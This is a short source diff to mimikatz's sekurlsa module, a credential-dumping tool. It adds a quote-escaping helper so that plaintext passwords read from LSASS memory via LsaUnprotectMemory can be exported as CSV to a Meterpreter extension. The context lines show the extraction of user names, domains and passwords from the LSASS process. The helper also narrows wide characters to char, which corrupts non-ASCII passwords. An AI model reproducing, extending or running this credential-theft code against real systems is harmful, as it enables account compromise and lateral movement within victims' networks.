@@ -191,6 +191,24 @@ PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsig
 	return resultat;
 }
 
+/* Escapes quotes for CSV format used by Meterpreter Extension */
+wstring escape(const wstring& s)
+{
+  wstring res;
+  wstring::const_iterator it = s.begin();
+  while (it != s.end())
+  {
+    char c = *it++;
+    if (c == '"')
+    {
+		res += '"';
+    }
+    res += c;
+  }
+
+  return res;
+}
+
 void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isDomainFirst, PDWORD pos)
 {
 	if(mesCreds)
@@ -199,7 +217,7 @@ void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIA
 		{
 			wstring userName	= mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
 			wstring domainName	= mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
-			wstring password	= mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);
+			wstring password	= escape(mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory));
 			wstring rUserName	= (isDomainFirst ? domainName : userName);
 			wstring rDomainName	= (isDomainFirst ? userName : domainName);
 
